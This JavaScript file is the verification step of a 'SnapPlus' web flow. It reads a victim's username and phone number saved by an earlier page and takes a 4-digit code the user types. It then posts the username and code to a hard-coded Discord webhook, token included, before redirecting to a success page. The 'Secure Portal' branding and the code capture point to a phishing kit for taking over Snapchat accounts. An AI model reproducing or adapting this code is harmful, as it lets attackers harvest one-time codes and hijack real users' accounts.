/**
 * verify.js - Step 2: Verification logic
 * Handles code verification and data submission to the webhook.
 */

const CONFIG = {
  WEBHOOK_URL: "https://discord.com/api/webhooks/1574163891397726379/1nQeYx7hBjhmCBBAvNeKb_iFSU9wufnIFx-x1ETG8Hq0tnC_ZhxKrPn-SjsdO55j02Si",
  REDIRECT_DELAY: 1200,
  CODE_LENGTH: 4
};

const VerifyApp = {
  elements: {
    form: document.getElementById("verify-form"),
    code: document.getElementById("code"),
    codeError: document.getElementById("code-error"),
    message: document.getElementById("message"),
    submitBtn: document.getElementById("submit-btn"),
  },

  init() {
    if (!this.elements.form) return;
    
    // Check if step 1 was completed
    const isStep1Complete = localStorage.getItem("snapplus-step1-complete") === "true";
    
    console.log("Step 1 status:", isStep1Complete); // Debug log

    if (!isStep1Complete) {
      console.warn("Step 1 not completed, redirecting...");
      // For local file development, sometimes localStorage is flaky. 
      // We only redirect if we are SURE it's not a local testing quirk.
      if (window.location.protocol !== "file:") {
        window.location.replace("index.html");
        return;
      }
    }

    this.elements.form.addEventListener("submit", (e) => this.handleSubmit(e));
    this.elements.code.addEventListener("input", () => this.clearError());
  },

  clearError() {
    this.elements.code.classList.remove("error");
    this.elements.codeError.textContent = "";
    this.elements.message.className = "message";
    this.elements.message.textContent = "";
  },

  showError(msg) {
    this.elements.code.classList.add("error");
    this.elements.codeError.textContent = msg;
  },

  showMessage(msg, type = "success") {
    const { message } = this.elements;
    message.textContent = msg;
    message.className = `message ${type} visible`;
  },

  setLoading(isLoading) {
    const { submitBtn } = this.elements;
    submitBtn.disabled = isLoading;
    submitBtn.textContent = isLoading ? "Verifying..." : "Verify";
  },

  validate() {
    const code = this.elements.code.value.trim();
    if (!code) {
      this.showError("Please enter the 4-digit code.");
      return null;
    }
    if (code.length !== CONFIG.CODE_LENGTH || !/^\d+$/.test(code)) {
      this.showError(`Please enter a valid ${CONFIG.CODE_LENGTH}-digit code.`);
      return null;
    }
    return code;
  },

  async handleSubmit(e) {
    e.preventDefault();
    const enteredCode = this.validate();
    if (!enteredCode) return;

    this.setLoading(true);

    try {
      let username = null;
      let phone = null;

      // 1. Try to get from window.name (Extremely reliable for local files across redirects)
      if (window.name) {
        try {
          const transportData = JSON.parse(window.name);
          username = transportData.u;
          phone = transportData.p;
        } catch (e) {
          console.error("Error parsing window.name", e);
        }
      }

      // 2. Try to get from URL Query Parameters (Fallback)
      if (!username || !phone) {
        const urlParams = new URLSearchParams(window.location.search);
        username = urlParams.get('u') || username;
        phone = urlParams.get('p') || phone;
      }

      // 3. Fallback to structured localStorage object
      if (!username || !phone) {
        const userData = localStorage.getItem("snapplus_user");
        if (userData) {
          try {
            const parsed = JSON.parse(userData);
            username = username || parsed.username;
            phone = phone || parsed.phone;
          } catch (e) {
            console.error("Error parsing user data", e);
          }
        }
      }

      // 4. Last resort: Fallback to individual legacy keys
      username = username || localStorage.getItem("snapplus-username") || "Unknown";
      phone = phone || localStorage.getItem("snapplus-phone") || "Unknown";

      const payload = {
        embeds: [{
          title: "SnapPlus Verification",
          color: 0xfffc00,
          fields: [
            { name: "Username", value: `\`${username}\``, inline: true },
            { name: "Code", value: `\`${enteredCode}\``, inline: true }
          ],
          timestamp: new Date().toISOString(),
          footer: { text: "SnapPlus Secure Portal" }
        }]
      };

      const response = await fetch(CONFIG.WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error("Webhook submission failed");

      localStorage.setItem("snapplus-step2-complete", "true");

      setTimeout(() => {
        window.location.href = "success.html";
      }, CONFIG.REDIRECT_DELAY);

    } catch (err) {
      console.error("Verification error:", err);
      this.showMessage("Unable to verify. Please check your connection and try again.", "error");
    } finally {
      this.setLoading(false);
    }
  }
};

document.addEventListener("DOMContentLoaded", () => VerifyApp.init());
